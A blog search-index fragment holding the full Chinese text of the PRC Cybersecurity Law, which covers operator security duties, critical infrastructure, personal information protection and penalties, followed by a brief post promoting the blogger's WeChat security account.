        <content type="html"><![CDATA[<h1 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h1><p>中华人民共和国主席令</p><p>第五十三号</p><p>《中华人民共和国网络安全法》已由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，现予公布，自2017年6月1日起施行。</p><pre><code>中华人民共和国主席习近平2016年11月7日        </code></pre><h2 id="中华人民共和国网络安全法-1"><a href="#中华人民共和国网络安全法-1" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h2><p>目    录</p><p>第一章  总则… 1</p><p>第二章  网络安全支持与促进… 2</p><p>第三章  网络运行安全… 3</p><p>第一节 一般规定… 3</p><p>第二节 关键信息基础设施的运行安全… 5</p><p>第四章  网络信息安全… 6</p><p>第五章  监测预警与应急处置… 8</p><p>第六章  法律责任… 9</p><p>第七章  附则… 13</p><h3 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章  总则"></a>第一章  总则</h3><p>   第一条  为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>   第二条  在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>   第三条  国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>   第四条  国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>   第五条  国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>   第六条  国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>第七条  国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>第八条  国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>第九条  网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>第十条  建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>第十一条  网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>第十二条  国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>第十三条  国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>第十四条  任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><h3 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h3><p>第十五条  国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>第十六条  国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>第十七条  国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>第十八条  国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>第十九条  各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>第二十条  国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><h3 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h3><p>第一节 一般规定<br>第二十一条  国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>（四）采取数据分类、重要数据备份和加密等措施；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第二十二条  网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>第二十三条  网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>第二十四条  网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>第二十五条  网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>第二十六条  开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>第二十七条  任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>第二十八条  网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>第二十九条  国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>第三十条  网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>第二节 关键信息基础设施的运行安全<br>第三十一条  国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>第三十二条  按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>第三十三条  建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>第三十四条  除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>（三）对重要系统和数据库进行容灾备份；</p><p>（四）制定网络安全事件应急预案，并定期进行演练；</p><p>（五）法律、行政法规规定的其他义务。</p><p>第三十五条  关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>第三十六条  关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>第三十七条  关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>第三十八条  关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>第三十九条  国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><h3 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h3><p>第四十条  网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>第四十一条  网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>第四十二条  网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>第四十三条  个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>第四十四条  任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>第四十五条  依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>第四十六条  任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>第四十七条  网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>第四十八条  任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>第四十九条  网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>第五十条  国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><h3 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h3><p>第五十一条  国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>第五十二条  负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>第五十三条  国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>第五十四条  网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>第五十五条  发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>第五十六条  省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>第五十七条  因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>第五十八条  因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><h3 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h3><p>第五十九条  网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>第六十条  违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>（一）设置恶意程序的；</p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>（三）擅自终止为其产品、服务提供安全维护的。</p><p>第六十一条  网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十二条  违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>第六十三条  违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>第六十四条  网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>第六十五条  关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十六条  关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>第六十七条  违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>第六十八条  网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>第六十九条  网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>第七十条  发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>第七十一条  有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>第七十二条  国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>第七十三条  网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>第七十四条  违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>第七十五条  境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h3 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章 附则"></a>第七章 附则</h3><p>第七十六条  本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>第七十七条  存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>第七十八条  军事网络的安全保护，由中央军事委员会另行规定。</p><p>第七十九条  本法自2017年6月1日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 法律 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 法律 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇</title>
      <link href="/2019/10/06/%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
      <url>/2019/10/06/%E7%AC%AC%E4%B8%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>微新公众号，欢迎大家来关注啊。<br>目前公众号文章要多一点哦。<br>希望大家多多支持啊！</p><p>名字就是小白安全之路</p><p>二维码在下面</p><p><img src="/images/ewm.jpg" alt></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
